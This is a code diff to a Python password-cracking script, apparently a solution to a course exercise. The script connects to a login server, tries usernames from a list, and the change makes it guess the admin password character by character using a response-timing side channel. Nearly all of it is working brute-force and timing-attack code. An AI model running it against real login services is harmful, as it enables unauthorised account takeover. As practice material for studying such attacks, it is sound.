@@ -4,10 +4,10 @@
 
 import json
 import socket
-import pdb
 import sys
 import string
 import itertools
+import datetime
 
 char_gen = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
@@ -42,6 +42,8 @@ class HackerSocket:
         encoded_message = self.socket.recv(size)
         message = encoded_message.decode('utf8')
         return json.loads(message)
+    def close(self):
+        self.socket.close()
 
 
 if __name__ == '__main__':
@@ -63,7 +65,7 @@ if __name__ == '__main__':
             found_username = admin_name
             break
 
-    #   loops through characters until exception occurs and generates password from rules defined in problem
+    #   loops through characters until pause occurs and generates password from rules defined in problem
     password_response = {}
     num_chars = 1
     num_attempts = 0
@@ -71,28 +73,34 @@ if __name__ == '__main__':
     while password_response.get("result") != "Connection success!":
         password_response = {}
         pass_generator = itertools.product(char_gen, repeat=num_chars)
-        while password_response.get("result") != "Exception happened during login" and password_response.get("result") != "Connection success!":
+        total_time = datetime.timedelta(0)
+        while total_time.microseconds < 50000:
             try:
                 password_attempt = built_password + ''.join(next(pass_generator))
+                initial_time = datetime.datetime.now()
             except StopIteration:
                 print(password_response.get("result"))
                 raise RuntimeError('Error in password generation')
 
             admin_json = create_json(found_username, password_attempt)
             hacker_socket.json_send(admin_json)
-            password_response = json.loads(hacker_socket.socket.recv(4096).decode('utf8'))
+            try:
+                password_response = json.loads(hacker_socket.socket.recv(4096).decode('utf8'))
+                final_time = datetime.datetime.now()
+                total_time = final_time - initial_time
+            except (ConnectionAbortedError, ConnectionResetError):
+                break
+
             num_attempts += 1
 
-            if password_response.get("result") == "Exception happened during login" or password_response.get("result") == "Connection success!":
+
+            if  total_time.microseconds >= 50000 or password_response.get("result") == "Connection success!":
                 built_password = password_attempt
             if num_attempts > 100000:
                 print('num attempts exceeded one million, broke loop')
                 exit()
-
-
-
-
-    print(json.dumps(create_json(found_username, built_password), indent=0))
+    hacker_socket.close()
+    print(json.dumps(create_json(found_username, built_password), indent=1))
 
 
 
